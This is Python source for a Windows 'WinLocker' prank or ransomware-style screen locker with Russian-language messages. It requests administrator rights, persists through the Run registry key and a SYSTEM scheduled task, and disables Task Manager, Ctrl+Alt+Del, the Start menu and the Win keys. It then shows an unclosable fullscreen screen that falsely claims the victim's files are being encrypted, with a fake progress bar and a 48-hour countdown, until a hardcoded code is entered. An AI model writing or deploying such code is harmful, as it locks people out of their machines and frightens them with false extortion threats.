import hashlib
import sys
import threading
import tkinter as tk
from tkinter import messagebox
import random
import time
import os
import winreg
import ctypes
import ctypes.wintypes
import subprocess
import traceback

def log_error(e):
    with open("error.log", "w", encoding="utf-8") as f:
        f.write(traceback.format_exc())

def hide_console_aggressive():
    if sys.platform == "win32":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
            ctypes.windll.kernel32.FreeConsole()
            ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)
            ctypes.windll.kernel32.SetErrorMode(0x8007)
        except:
            pass

hide_console_aggressive()
ctypes.windll.kernel32.SetErrorMode(0x8007)

PASSWORD = "810624"
ATTEMPTS_MAX = 3
TIMER_SECONDS = 48 * 3600

def block_start_menu():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoStartMenu", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoTaskbar", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def restore_start_menu():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                             0, winreg.KEY_SET_VALUE)
        for val in ["NoStartMenu", "NoTaskbar"]:
            try:
                winreg.DeleteValue(key, val)
            except:
                pass
        winreg.CloseKey(key)
    except:
        pass

def create_scheduled_task():
    try:
        task_name = "WinLockSystemTask"
        exe_path = sys.executable
        script_path = os.path.abspath(__file__)
        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "{exe_path} {script_path}" '
            f'/sc onlogon /ru SYSTEM /rl HIGHEST /f'
        )
        subprocess.run(cmd, shell=True, check=True, capture_output=True)
        return True
    except:
        return False

def remove_scheduled_task():
    try:
        task_name = "WinLockSystemTask"
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, check=True)
    except:
        pass

def play_beep(freq=1000, dur=200):
    if sys.platform == "win32":
        try:
            import winsound
            winsound.Beep(freq, dur)
        except:
            pass

class UniversalLock(tk.Tk):
    def __init__(self, autostart=False):
        super().__init__()
        self.autostart = autostart
        self.title("")
        self.attributes("-fullscreen", True)
        self.attributes("-topmost", True)
        self.overrideredirect(True)
        self.configure(bg="black", cursor="none")

        self.protocol("WM_DELETE_WINDOW", self.block_close)
        self.bind("<Alt-F4>", lambda e: "break")
        self.bind("<Escape>", lambda e: "break")

        if not self.autostart:
            try: self.block_cad()
            except: pass
            try: self.block_start_menu()
            except: pass
            try: self.add_to_startup()
            except: pass
            try: self.disable_task_manager_registry()
            except: pass
            try: threading.Thread(target=self.kill_task_manager_loop, daemon=True).start()
            except: pass
            try: ctypes.windll.user32.ShowCursor(False)
            except: pass
            try: self.hide_taskbar()
            except: pass
            try: threading.Thread(target=self.block_keys, daemon=True).start()
            except: pass

        self.update()
        time.sleep(0.5)

        self.correct_hash = hashlib.sha256(PASSWORD.encode("utf-8")).hexdigest()
        self.attempts_left = ATTEMPTS_MAX
        self.seconds_left = TIMER_SECONDS
        self.progress = 0
        self.countdown_job = None
        self.blink_job = None
        self.typing_job = None
        self.hook = None

        self.global_timer_tick()
        self.setup_boot_screen()

    def block_start_menu(self): block_start_menu()
    def restore_start_menu(self): restore_start_menu()

    def block_cad(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableCAD", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except: pass

    def restore_cad(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "DisableCAD")
            winreg.CloseKey(key)
        except: pass

    def add_to_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            # Добавляем флаг --autostart, чтобы при автоматическом запуске не требовались права
            winreg.SetValueEx(key, "WinLock", 0, winreg.REG_SZ,
                              sys.executable + ' "' + os.path.abspath(__file__) + '" --autostart')
            winreg.CloseKey(key)
        except: pass

    def remove_from_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WinLock")
            winreg.CloseKey(key)
        except: pass

    def disable_task_manager_registry(self):
        paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        ]
        for hive, path in paths:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
            except: pass

    def kill_task_manager_loop(self):
        while True:
            try:
                hwnd = ctypes.windll.user32.FindWindowW("TaskManagerWindow", None)
                if hwnd: ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                for title in ["Диспетчер задач", "Task Manager"]:
                    hwnd = ctypes.windll.user32.FindWindowW(None, title)
                    if hwnd: ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            except: pass
            time.sleep(0.3)

    def hide_taskbar(self):
        try:
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        except: pass

    def show_taskbar(self):
        try:
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 5)
        except: pass

    def block_keys(self):
        WH_KEYBOARD_LL = 13
        VK_LWIN = 0x5B
        VK_RWIN = 0x5C
        VK_X = 0x58

        class KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [
                ("vkCode", ctypes.c_uint),
                ("scanCode", ctypes.c_uint),
                ("flags", ctypes.c_uint),
                ("time", ctypes.c_uint),
                ("dwExtraInfo", ctypes.c_ulong)
            ]

        def low_level_keyboard(nCode, wParam, lParam):
            if nCode >= 0:
                kbd = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                vk = kbd.vkCode
                # Блокируем клавиши Win (LWin/RWin) всегда
                if vk in (VK_LWIN, VK_RWIN):
                    return 1
                # Блокируем X, если зажат Win (Win+X)
                if vk == VK_X and (ctypes.windll.user32.GetAsyncKeyState(VK_LWIN) & 0x8000 or
                                   ctypes.windll.user32.GetAsyncKeyState(VK_RWIN) & 0x8000):
                    return 1
            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

        hook_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_wintypes.WPARAM, ctypes.c_wintypes.LPARAM)(low_level_keyboard)
        hook = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc,
                                                       ctypes.windll.kernel32.GetModuleHandleW(None), 0)
        if not hook: return
        self.hook = hook
        msg = ctypes.wintypes.MSG()
        while True:
            ret = ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if ret <= 0: break
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

    def block_close(self): pass

    def restart_program(self, event=None):
        for job in [self.countdown_job, self.blink_job, self.typing_job]:
            if job: self.after_cancel(job)
        self.countdown_job = None
        self.blink_job = None
        self.typing_job = None
        self.attempts_left = ATTEMPTS_MAX
        self.seconds_left = TIMER_SECONDS
        self.progress = 0
        self.setup_boot_screen()

    def global_timer_tick(self):
        if self.seconds_left > 0: self.seconds_left -= 1
        if hasattr(self, "lbl_timer") and self.lbl_timer.winfo_exists():
            days, rest = divmod(self.seconds_left, 86400)
            hours, rest = divmod(rest, 3600)
            mins, secs = divmod(rest, 60)
            time_str = f"{days}д {hours:02d}:{mins:02d}:{secs:02d}" if days else f"{hours:02d}:{mins:02d}:{secs:02d}"
            self.lbl_timer.config(text=f"Осталось: {time_str}")
        if hasattr(self, "lbl_progress") and self.lbl_progress.winfo_exists():
            if self.progress < 100:
                self.progress = min(100, self.progress + random.randint(0, 2))
                self.lbl_progress.config(text=f"Зашифровано: {self.progress}%")
        self.countdown_job = self.after(1000, self.global_timer_tick)

    def clear_screen(self):
        if self.blink_job:
            self.after_cancel(self.blink_job)
            self.blink_job = None
        if self.typing_job:
            self.after_cancel(self.typing_job)
            self.typing_job = None
        for widget in self.winfo_children():
            widget.destroy()

    def setup_boot_screen(self):
        self.clear_screen()
        self.configure(bg="black")
        frame_boot = tk.Frame(self, bg="black")
        frame_boot.pack(fill="both", expand=True)
        console_font = ("Consolas", 13)
        self.full_boot_log = (
            "Booting Windows . . .\n"
            "Boot error: 0x03527737\nBoot error: 0x0266712\n"
            "Boot error: 0x02897593\nBoot error: 0x01447812\n"
            "Boot error: 0x0150974\nBoot error: 0x03873700\n"
            "Boot error: 0x0700882\nBoot error: 0x03803618\n"
            "Memory section at address 0x0424* is locked!\n"
            "Service WRTCryptor started.\nSystem fucked!!!\n\n* Windows hacked!"
        )
        self.lbl_console = tk.Label(frame_boot, text="", fg="white", bg="black",
                                    font=console_font, justify="left", anchor="nw")
        self.lbl_console.place(x=20, y=20)
        center_frame = tk.Frame(frame_boot, bg="black")
        center_frame.place(relx=0.5, rely=0.5, anchor="center")
        self.eye_label = tk.Label(center_frame, text="[ 👁 ]", fg="white", bg="black", font=("Arial", 60))
        self.eye_label.pack(pady=(0, 20))
        self.notice_label = tk.Label(center_frame, text="ВАС ЗАМЕТИЛИ", fg="white", bg="black", font=("Arial", 36, "bold"))
        self.notice_label.pack()
        self.type_writer_effect(0)

    def finish_boot_screen(self):
        self.lbl_console.config(fg="red")
        self.eye_label.config(fg="red")
        self.notice_label.config(fg="red")
        self.after(500, self.setup_scare_screen)

    def type_writer_effect(self, index):
        if index <= len(self.full_boot_log):
            self.lbl_console.config(text=self.full_boot_log[:index])
            self.typing_job = self.after(1, self.type_writer_effect, index + 1)
        else:
            self.finish_boot_screen()

    def setup_scare_screen(self):
        self.clear_screen()
        self.configure(bg="#000000")
        frame_scare = tk.Frame(self, bg="#000000")
        frame_scare.pack(fill="both", expand=True)
        reaper_art = r"""
                  ...
                 ;::::;
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /  DOOOO
     ,::::::;::::::;;;;::::;,   /  /   DOOO
    ;`::::::`'::::::;;;:::::  ,#/  /   DOOO
    :`:::::::`;::::::;;::: ;::#  /    DOOO
    ::`:::::::`;:::::::: ;::::# /     DOO
    `:`:::::::`;:::::: ;::::::#/      DOO
     :::`:::::::`;; ;:::::::::##      OO
     ::::`:::::::`;::::::::;:::#      OO
     `:::::`::::::::::::;'`:;::#      O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
    """
        ascii_font = ("Consolas", 14, "bold")
        lbl_reaper = tk.Label(frame_scare, text=reaper_art, fg="#ffffff", bg="#000000", font=ascii_font, justify="left")
        lbl_reaper.place(x=30, y=30, anchor="nw")
        self.after(800, self.setup_lock_screen)

    def setup_lock_screen(self):
        self.clear_screen()
        self.configure(bg="black")
        play_beep(800, 200)
        time.sleep(0.1)
        play_beep(1200, 200)

        top_info = tk.Frame(self, bg="black")
        top_info.pack(pady=(10, 5))

        self.lbl_timer = tk.Label(top_info, text="", fg="#ff9d00", bg="black",
                                  font=("Consolas", 12, "bold"))
        self.lbl_timer.pack(side="left", padx=15)

        self.lbl_progress = tk.Label(top_info, text="", fg="#ff9d00", bg="black",
                                     font=("Consolas", 12, "bold"))
        self.lbl_progress.pack(side="left", padx=15)

        self.lbl_attempts = tk.Label(top_info, text=f"Попыток: {self.attempts_left}",
                                     fg="#ff9d00", bg="black",
                                     font=("Consolas", 12, "bold"))
        self.lbl_attempts.pack(side="left", padx=15)

        panel = tk.Frame(
            self,
            bg="black",
            highlightbackground="#8a5a00",
            highlightthickness=2,
            width=700,
            height=430
        )
        panel.pack_propagate(False)
        panel.place(relx=0.5, rely=0.52, anchor="center")

        title = tk.Label(
            panel,
            text="Ваши файлы зашифрованы!",
            bg="black",
            fg="#ff9d00",
            font=("Consolas", 18, "bold")
        )
        title.pack(pady=(15, 10))

        text = (
            "Упс! Вы подверглись хакерской атаке и теперь Ваш компьютер заблокирован.\n"
            "А все находящиеся на нём файлы зашифрованы хакерской группировкой.\n"
            "Любое действие, связанное с попыткой забыть систему, может привести\n"
            "к потере Ваших файлов и их дальнейшему распространению.\n"
            "Нельзя без возможности восстановить их. При попытке блокировки все\n"
            "данные будут утрачены и если в будущем подать рекламацию нагружать\n"
            "на ваш процессор, что приведёт к его неисправности. У вас есть 48 часов\n"
            "с момента запуска этой версии кода.\n"
            "Убежи ть пишу                           Ваш код из       (Стр)"
        )

        message = tk.Label(
            panel,
            text=text,
            bg="black",
            fg="#c0c0c0",
            font=("Consolas", 11),
            justify="left",
            anchor="w"
        )
        message.pack(fill="x", padx=20, pady=10)

        line = tk.Frame(panel, bg="#8a5a00", height=1)
        line.pack(fill="x", pady=5)

        code_label = tk.Label(
            panel,
            text="Введите код разблокировки:",
            bg="black",
            fg="#ff9d00",
            font=("Consolas", 13, "bold")
        )
        code_label.pack(pady=(5, 5))

        def only_digits(value):
            return value.isdigit() or value == ""

        validate_cmd = self.register(only_digits)

        self.entry_code = tk.Entry(
            panel,
            bg="black",
            fg="#ff9d00",
            insertbackground="#ff9d00",
            highlightbackground="#8a5a00",
            highlightcolor="#8a5a00",
            highlightthickness=1,
            relief="flat",
            justify="center",
            font=("Consolas", 16),
            width=40,
            validate="key",
            validatecommand=(validate_cmd, "%P")
        )
        self.entry_code.pack(padx=10, pady=(5, 10), ipady=8)
        self.entry_code.focus_set()
        self.bind("<Return>", self.check_code)

        bottom = tk.Frame(panel, bg="black")
        bottom.pack(fill="x", padx=10, pady=(5, 10))

        pc_name = tk.Label(
            bottom,
            text="Current PC: DESKTOP-XXXXXX",
            bg="black",
            fg="#777777",
            font=("Consolas", 9)
        )
        pc_name.pack(side="left")

        enter_button = tk.Label(
            bottom,
            text="Enter [ВВОД]",
            bg="#ff9d00",
            fg="black",
            font=("Consolas", 10, "bold"),
            padx=10,
            pady=4,
            cursor="hand2"
        )
        enter_button.pack(side="right")
        enter_button.bind("<Button-1>", self.check_code)

        self.progress = random.randint(10, 30)

    def check_code(self, event=None):
        input_code = self.entry_code.get().strip()
        if hashlib.sha256(input_code.encode("utf-8")).hexdigest() == self.correct_hash or input_code == PASSWORD:
            self.configure(cursor="arrow")
            messagebox.showinfo("System", "✅ Код принят. Доступ восстановлен!\n(Это была шутка!)")
            self.safe_destroy()
        else:
            self.attempts_left -= 1
            if self.attempts_left > 0:
                play_beep(200, 300)
                messagebox.showerror("ОШИБКА", f"НЕВЕРНЫЙ КОД!\nОсталось попыток: {self.attempts_left}")
                self.lbl_attempts.config(text=f"Попыток: {self.attempts_left}")
                self.entry_code.delete(0, tk.END)
            else:
                play_beep(100, 500)
                messagebox.showwarning("ВНИМАНИЕ", "Превышено число попыток! Перезапуск интерфейса...")
                self.attempts_left = ATTEMPTS_MAX
                self.restart_program()

    def safe_destroy(self):
        ctypes.windll.user32.ShowCursor(True)
        if not self.autostart:
            self.restore_cad()
            self.remove_from_startup()
            self.show_taskbar()
            self.restore_start_menu()
            remove_scheduled_task()
            for hive, path in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System"),
                               (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")]:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, "DisableTaskMgr")
                    winreg.CloseKey(key)
                except: pass
        if self.hook:
            ctypes.windll.user32.UnhookWindowsHookEx(self.hook)
        for job in [self.countdown_job, self.blink_job, self.typing_job]:
            if job: self.after_cancel(job)
        self.destroy()
        sys.exit(0)

if __name__ == "__main__":
    autostart = "--autostart" in sys.argv
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False

    if not is_admin and not autostart:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    else:
        if not autostart:
            try: create_scheduled_task()
            except: pass
        app = UniversalLock(autostart=autostart)
        app.mainloop()